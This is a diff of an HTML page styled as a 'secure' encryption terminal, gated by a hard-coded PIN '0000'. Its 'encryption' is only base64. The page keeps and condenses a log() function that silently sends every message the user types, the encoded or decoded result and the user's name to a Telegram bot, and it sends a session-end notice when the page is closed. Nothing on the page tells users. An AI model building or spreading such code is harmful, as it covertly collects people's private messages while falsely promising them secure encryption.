@@ -2,20 +2,24 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SECURE_CORE_TERMINAL</title>
     <style>
-        body, html { margin: 0; padding: 0; height: 100%; font-family: 'Courier New', monospace; color: #00ff41; background: #000; overflow: auto; }
+        body, html { margin: 0; padding: 0; min-height: 100%; font-family: 'Courier New', monospace; color: #00ff41; background: #000; overflow-y: auto; }
         #terminal-bg { position: fixed; inset: 0; background: radial-gradient(circle, #051a05 0%, #000 100%); z-index: -1; }
         canvas { position: fixed; top: 0; left: 0; z-index: 0; pointer-events: none; }
-        .layer { position: relative; display: flex; align-items: center; justify-content: center; z-index: 10; min-height: 80vh; }
-        .panel { width: 350px; padding: 30px; border: 1px solid #00ff41; background: rgba(0, 10, 0, 0.95); text-align: center; box-shadow: 0 0 20px rgba(0, 255, 65, 0.2); }
+        
+        .container { position: relative; z-index: 10; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
+        .panel { width: 100%; max-width: 400px; padding: 30px; border: 1px solid #00ff41; background: rgba(0, 10, 0, 0.95); text-align: center; box-shadow: 0 0 20px rgba(0, 255, 65, 0.2); margin-bottom: 20px; }
+        
         .btn { padding: 12px; border: 1px solid #00ff41; background: transparent; color: #00ff41; cursor: pointer; width: 100%; margin-top: 10px; font-weight: bold; }
         .btn:hover { background: #00ff41; color: #000; }
         input, textarea { width: 100%; background: #000; color: #00ff41; border: 1px solid #00ff41; padding: 10px; margin: 10px 0; box-sizing: border-box; }
         .hidden { display: none; }
-        #timer-display { position: absolute; top: 10px; left: 10px; font-size: 18px; z-index: 20; color: #fff; }
-        /* Developer Footer Styles */
-        .dev-footer { text-align: center; padding: 20px; font-size: 12px; border-top: 1px solid #00ff41; margin-top: 20px; color: #008f11; line-height: 1.5; }
+        #timer-display { position: absolute; top: 10px; left: 10px; font-size: 18px; color: #fff; }
+        
+        .dev-footer { text-align: center; padding: 20px; font-size: 13px; border-top: 1px solid #00ff41; margin-top: auto; color: #008f11; width: 100%; background: rgba(0,0,0,0.8); }
+        a { color: #00ff41; text-decoration: none; }
     </style>
 </head>
 <body>
@@ -24,24 +28,20 @@
     <div id="terminal-bg"></div>
     <canvas id="matrix"></canvas>
 
-    <div id="name-ui" class="layer">
-        <div class="panel">
+    <div class="container">
+        <div id="name-ui" class="panel">
             <h3>[ OPERATOR_ID ]</h3>
             <input type="text" id="username" placeholder="NAME" onkeypress="if(event.key==='Enter') saveName()">
             <button class="btn" onclick="saveName()">[ ACCESS ]</button>
         </div>
-    </div>
 
-    <div id="pin-ui" class="layer hidden">
-        <div class="panel">
+        <div id="pin-ui" class="panel hidden">
             <h3>[ PIN_AUTH ]</h3>
             <input type="password" id="pin-input" maxlength="4" placeholder="PIN" onkeypress="if(event.key==='Enter') checkPin()">
             <button class="btn" onclick="checkPin()">[ CONFIRM ]</button>
         </div>
-    </div>
 
-    <div id="main-ui" class="layer hidden">
-        <div class="panel">
+        <div id="main-ui" class="panel hidden">
             <h3>[ CORE_ENCRYPTION ]</h3>
             <textarea id="msg" placeholder="TYPE_MESSAGE..."></textarea>
             <button class="btn" onclick="proc('encode')">[ ENCODE ]</button>
@@ -49,14 +49,13 @@
             <div id="out" style="border:1px dashed #00ff41; padding:10px; margin:10px 0; word-break: break-all;">OUTPUT</div>
             <button class="btn" onclick="copyOut()">[ COPY_BUFFER ]</button>
         </div>
-    </div>
 
-    <!-- Developer Info Footer -->
-    <div class="dev-footer">
-        <p>DEVELOPER: NILOY GHOSH (@CipherSentinel_BD)</p>
-        <p>Email: n7753522@gmail.com</p>
-        <p>Advertise with us: <a href="https://t.me/DeIIIeted" style="color: #00ff41; text-decoration: none;">@DeIIIeted</a></p>
-        <p>&copy; 2026 SECURE_CORE_SYSTEM. All Rights Reserved.</p>
+        <div class="dev-footer">
+            <p>DEVELOPER: NILOY GHOSH (@CipherSentinel_BD)</p>
+            <p>Email: <a href="mailto:n7753522@gmail.com">n7753522@gmail.com</a></p>
+            <p>Advertise: <a href="https://t.me/DeIIIeted">@DeIIIeted</a></p>
+            <p>&copy; 2026 SECURE_CORE_SYSTEM.</p>
+        </div>
     </div>
 
 <script>
@@ -71,54 +70,12 @@
     function draw() { ctx.fillStyle = 'rgba(0,0,0,0.05)'; ctx.fillRect(0,0,c.width,c.height); ctx.fillStyle = '#00ff41'; ctx.font = '15px monospace'; drops.forEach((y, i) => { ctx.fillText(chars[Math.floor(Math.random()*chars.length)], i*20, y*20); if(y*20 > c.height) drops[i] = 0; drops[i]++; }); } setInterval(draw, 60);
 
     function log(msg) { fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`); }
-
     function saveName() { username = document.getElementById('username').value; if(username) { document.getElementById('name-ui').classList.add('hidden'); document.getElementById('pin-ui').classList.remove('hidden'); document.getElementById('pin-input').focus(); } }
-    
-    function checkPin() { 
-        if(document.getElementById('pin-input').value === "0000") { 
-            document.getElementById('pin-ui').classList.add('hidden'); 
-            document.getElementById('main-ui').classList.remove('hidden'); 
-            document.getElementById('timer-display').classList.remove('hidden');
-            startTimer(); 
-        } else { alert("WRONG PIN"); document.getElementById('pin-input').value = ""; } 
-    }
-
-    function startTimer() {
-        startTime = Date.now();
-        timerInterval = setInterval(() => {
-            let elapsed = Math.floor((Date.now() - startTime) / 1000);
-            let m = Math.floor(elapsed / 60), s = elapsed % 60;
-            document.getElementById('timer-display').innerText = `TIME: ${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
-        }, 1000);
-    }
-
-    window.onbeforeunload = () => {
-        let elapsed = Math.floor((Date.now() - startTime) / 1000);
-        let m = Math.floor(elapsed / 60), s = elapsed % 60;
-        log(`SESSION ENDED\nOperator: ${username}\nDuration: ${m}m ${s}s`);
-    };
-
-    function proc(mode) {
-        let val = document.getElementById('msg').value;
-        try { 
-            let res = (mode === 'encode') ? btoa(val) : atob(val); 
-            document.getElementById('out').innerText = res; 
-            let logMsg = (mode === 'encode') ? `ENCRYPTED: ${val}\nRESULT: ${res}\nUser: ${username}` : `DECRYPTED: ${val}\nRESULT: ${res}\nUser: ${username}`;
-            log(logMsg); 
-        } catch(e) { alert("DATA CORRUPTION"); }
-    }
-
-    function copyOut() {
-        const text = document.getElementById('out').innerText;
-        if(text === "OUTPUT" || !text) return;
-        const textArea = document.createElement("textarea");
-        textArea.value = text;
-        document.body.appendChild(textArea);
-        textArea.select();
-        document.execCommand("copy");
-        document.body.removeChild(textArea);
-        alert("COPIED!");
-    }
+    function checkPin() { if(document.getElementById('pin-input').value === "0000") { document.getElementById('pin-ui').classList.add('hidden'); document.getElementById('main-ui').classList.remove('hidden'); document.getElementById('timer-display').classList.remove('hidden'); startTimer(); } else { alert("WRONG PIN"); document.getElementById('pin-input').value = ""; } }
+    function startTimer() { startTime = Date.now(); timerInterval = setInterval(() => { let elapsed = Math.floor((Date.now() - startTime) / 1000); let m = Math.floor(elapsed / 60), s = elapsed % 60; document.getElementById('timer-display').innerText = `TIME: ${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`; }, 1000); }
+    window.onbeforeunload = () => { if(username) log(`SESSION ENDED\nOperator: ${username}`); };
+    function proc(mode) { let val = document.getElementById('msg').value; try { let res = (mode === 'encode') ? btoa(val) : atob(val); document.getElementById('out').innerText = res; log(`${mode.toUpperCase()}: ${val}\nRESULT: ${res}\nUser: ${username}`); } catch(e) { alert("DATA CORRUPTION"); } }
+    function copyOut() { const text = document.getElementById('out').innerText; if(text === "OUTPUT" || !text) return; navigator.clipboard.writeText(text); alert("COPIED!"); }
 </script>
 </body>
 </html>
